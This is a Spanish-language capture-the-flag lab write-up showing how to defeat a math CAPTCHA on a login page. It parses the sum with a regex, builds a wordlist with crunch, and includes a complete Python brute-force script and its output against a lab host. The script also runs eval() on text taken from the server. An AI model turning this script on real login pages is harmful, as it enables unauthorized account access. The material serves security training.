
# Bypass CAPTCHA

## <mark style="color:$primary;">Lab -</mark> <mark style="color:$primary;"></mark><mark style="color:$primary;">**Attacking Login Page: Math CAPTCHA**</mark>

Agregar un captcha a la página de inicio de sesión podría ralentizar los ataques automatizados de fuerza bruta y de diccionario. Sin embargo, el captcha por sí solo no es suficiente para prevenir dichos ataques; existen diversas bibliotecas de programación para procesar el captcha y automatizar el ataque.

En este ejercicio veremos cómo automatizar un ataque a una página de inicio de sesión con un captcha matemático.&#x20;

**Objetivo**: Encontrar la contraseña del usuario "`admin`" y recuperar la flag.&#x20;

Instrucciones:&#x20;

* La contraseña contiene los caracteres "`4aMx]`" y tiene una longitud de 5 caracteres.

<figure><img src="/files/KCmmHf1N6hMUcHPANjf5" alt=""><figcaption></figcaption></figure>

Observamos que en el login tenemos un CAPTCHA matemático en el que tenemos que hacer una suma de 2 números. Si la suma es correcta pasaremos el CAPTCHA.

<figure><img src="/files/kw9qhP07zNuHf2KNHJlf" alt=""><figcaption></figcaption></figure>

Al hacer un login incorrecto observamos el mensaje de error, en el que solo se admiten contraseñas de 5 caracteres del character set `a,x,4,M,]`

<figure><img src="/files/QiidAm1SLqAcZQCOedjq" alt=""><figcaption></figcaption></figure>

Si el CAPTCHA es incorrecto tenemos el mensaje de error: `Incorrect Captcha!`

### Código fuente

Observamos que el CAPTCHA está hardcodeado en el código fuente de la web:

```html
<!-- form -->
      <form class="auth-form" method="post" action="login">

        <!-- /.form-group -->
        <!-- .form-group -->
        <div class="form-group">
          <div class="form-label-group">
            <input type="text" name="username" id="inputUser" class="form-control" placeholder="Username" required="">
            <label for="inputUser">Username</label>
          </div>
        </div>
        <!-- /.form-group -->
        <!-- .form-group -->
        <div class="form-group">
          <div class="form-label-group">
            <input type="password" name="password" id="inputPassword" class="form-control" placeholder="Password" required="">
            <label for="inputPassword">Password</label>
          </div>
        </div>
            <div class="row">
              <div class="col-xs-6 col-sm-6 col-md-6 col-lg-6">
                <p class="text-center text-muted mb-0 font-weight-bold"><h4 style="text-align: center;margin-top: 4px">2904 + 1558 = </h4></p>
              </div>
              <div class="col-xs-6 col-sm-6 col-md-6 col-lg-6">
                 <input type="text" name="captcha" id="inputCaptcha" class="form-control" placeholder="" required="">
              </div>
          </div>
        </div>
        </div>
        <!-- /.form-group -->
```

Observamos que el texto de la suma está dentro de una etiqueta H4:

```html
<h4 style="text-align: center;margin-top: 4px">2904 + 1558 = </h4>
```

### Scripting

Crearemos el siguiente script para enumerarlo y entender cómo funciona:

```python
import re
import requests

session = requests.Session()
regex = '<h4 style="text-align: center;margin-top: 4px">2904 + 1558 = </h4>'
response = session.get('http://192.14.10.3')
output = re.search(regex, response.text)

print(session.cookies.get_dict())
print(output.group(1))
```

Y sustituiremos el texto de la suma por la siguiente expresión `(.*?)`:

```python
import re
import requests

session = requests.Session()
regex = '<h4 style="text-align: center;margin-top: 4px">(.*?) = </h4>'
response = session.get('http://192.14.10.3')
output = re.search(regex, response.text)

print(session.cookies.get_dict())
print(output.group(1))
```

Al ejecutar el script observamos que obtenemos un Session ID y una suma distinta:

```bash
root@attackdefense:~/Desktop# python request.py 
{'session': '9d495f2a-3de8-41c0-a4f5-e34cebb332e5'}
6835 + 600

root@attackdefense:~/Desktop# python request.py 
{'session': 'd8d23ab7-2eea-43ca-a5fe-86681d84227c'}
7067 + 9674

root@attackdefense:~/Desktop# python request.py 
{'session': 'b7d3f79e-18d2-445b-b925-c6f58cd30e63'}
8210 + 5603
```

### Crunch - Diccionario Custom

Recordamos que la contraseña contiene los caracteres "`4aMx]`" y tiene una longitud de 5 caracteres, por lo que usaremos crunch para crear un diccionario personalizado:

```bash
root@attackdefense:~/Desktop# crunch 5 5 ax4M] -o passwords.txt

Crunch will now generate the following amount of data: 18750 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 3125 

crunch: 100% completed generating output
```

Como vemos nos genera un diccionario con todas las posibles variaciones, con un total de 3125 contraseñas.

### Bruteforce Script

Usaremos el siguiente script para realizar el bruteforce:

```python
import re
import requests

session = requests.Session()

regex = '<h4 style="text-align: center;margin-top: 4px">(.*?) = </h4>'

with open('passwords.txt','r') as f:
        for password in f:
                password = password.rstrip()
                response = session.get('http://192.14.10.3')
                output = re.search(regex, response.text)
                cookies = session.cookies.get_dict()
                captcha = eval(output.group(1))
                print("Probando password: "+password)
                data={"username":"admin","password":password,"captcha":captcha}
                output=session.post('http://192.14.10.3/login',cookies=cookies,data=data)

                if("Error" not in output.text):
                        print("Password valido: "+password)
                        break
```

```bash
python captchaBrute.py

Probando password: ax4a]
Probando password: ax4xa
Probando password: ax4xx
Probando password: ax4x4
Probando password: ax4xM
Probando password: ax4x]
Probando password: ax44a
Probando password: ax44x
Probando password: ax444
Probando password: ax44M
Probando password: ax44]
Probando password: ax4Ma
Probando password: ax4Mx
Probando password: ax4M4
Probando password: ax4MM
Probando password: ax4M]
Password valido: ax4M]
```

Obtenemos la contraseña válida y nos logueamos normalmente:

<figure><img src="/files/cJe2hFdWNn294GXWMPQX" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/BJgAnjeemj4Z9TML9jur" alt=""><figcaption></figcaption></figure>
